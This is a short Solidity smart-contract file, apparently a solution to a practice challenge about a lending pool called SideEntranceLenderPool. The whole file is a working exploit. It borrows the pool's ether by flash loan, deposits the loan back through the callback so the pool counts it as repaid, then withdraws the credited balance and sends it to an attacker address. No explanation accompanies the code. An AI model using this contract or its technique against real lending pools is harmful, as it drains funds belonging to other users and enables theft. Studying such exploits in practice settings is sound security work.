// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
interface ISideEntranceLenderPool{
    function deposit() external payable ;
    function withdraw() external ;
    function flashLoan(uint256 amount) external ;
}
contract attackSideEntrance{
    ISideEntranceLenderPool target;
    address payable attacker;
    constructor(address _target,address _attacker){
        target=ISideEntranceLenderPool(_target);
        attacker=payable(_attacker);
    } 
    function execute() public payable{
        target.deposit{value:msg.value}();
    }
    function attack(uint256 amount)public{
        target.withdraw();
        attacker.call{value:amount}("");
    }
    function flashLoan(uint256 amount)public{
        target.flashLoan(amount);
    }
    receive()payable external{}
}